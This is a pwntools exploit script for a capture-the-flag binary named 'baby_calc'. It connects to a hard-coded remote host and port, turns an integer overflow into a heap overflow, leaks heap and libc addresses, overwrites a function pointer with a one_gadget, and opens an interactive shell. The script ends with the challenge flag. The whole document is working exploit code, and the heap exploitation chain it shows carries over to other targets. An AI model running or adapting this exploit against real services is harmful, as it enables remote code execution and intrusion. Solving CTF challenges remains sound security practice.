#!/usr/bin/env python3
from pwn import *

context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Debian', 'bash', '-c']
context.arch = 'amd64'
host = '45.122.249.68'
port = 20002
elf_name = './baby_calc_patched'
elf = ELF(elf_name)
libc = ELF('./libc.so.6')
# b *setup_data+90
script = '''
set resolve-heap-via-heuristic on
b *setup_data+331
b *cleanup_data+67
c
'''
script += 'c\n'*12
if args.LOCAL:
    p = process(elf_name)
elif args.GDB:
    p = process(elf_name)
    gdb.attach(p, gdbscript=script)
else:
    p = remote(host, port)

# leak heap 
s = b'+\x00\x00\x00' + p32((2**32 + 0x30)//8) + p32(1) + p32(1) 
s += b'a'*(0x80 - len(s))
p.send(s)
p.sendafter(b' feedback: ', b'dummy')

s = b'+\x00\x00\x00' + p32((2**32 + 0x10)//8) + p32(1) + p32(1) 
s += b'a'*(0x80 - len(s))
p.send(s)
p.sendafter(b' feedback: ', b'dummy')

s = b'+\x00\x00\x00' + p32(0x420//8) + p32(1) + p32(1) 
s += b'a'*(0x80 - len(s))
p.send(s)
p.sendafter(b' feedback: ', b'dummy')

s = b'+\x00\x00\x00' + p32((2**32 + 0x30)//8) + p32(1) + p32(1) 
s += b'a'*(0x80 - len(s))
p.send(s)
payload = b'a'*0x30 
payload += p64(0) + p64(0x91) + b'a'*0x80
payload += p64(0) + p64(0x21) + b'\xf0'
p.sendafter(b' feedback: ', payload)

heap = u64(p.recv(6) + b'\x00\x00')
log.info("heap leak " + hex(heap))

# leak libc
s = b'+\x00\x00\x00' + p32((2**32 + 0x30)//8) + p32(1) + p32(1) 
s += b'a'*(0x80 - len(s))
p.send(s)
payload = b'a'*0x30 
payload += p64(0) + p64(0x91) + b'a'*0x80
payload += p64(0) + p64(0x21) + p64(heap - 0x270)
p.sendafter(b' feedback: ', payload)
libc_base = u64(p.recv(6) + b'\x00\x00') - 0x219ce0
libc.address = libc_base
log.info("libc_base leak " + hex(libc_base))

# func -> system
s = b'+\x00\x00\x00' + p32((2**32 + 0x40)//8) + p32(1) + p32(1) 
s += b'a'*(0x80 - len(s))
p.send(s)
p.sendafter(b' feedback: ', b'dummy')

one_gadget = 0xebcf8 + libc_base

s = b'+\x00\x00\x00' + p32((2**32 + 0x40)//8) + p32(1) + p32(1) 
s += b'a'*(0x80 - len(s))
p.send(s)
payload = b'a'*0x40
payload += p64(0) + p64(0x91) + b'a'*0x80
payload += p64(0) + p64(0x21) + p64(heap - 0x1f0) + p64(0)
payload += p64(0) + p64(0x31) \
            + p64(0x200000084e204c2b) + p64(0) + p64(0) + p64(one_gadget)

p.sendafter(b' feedback: ', payload)

p.interactive()
# W1{integer_overflow_to_heap_overflow_to_rce}
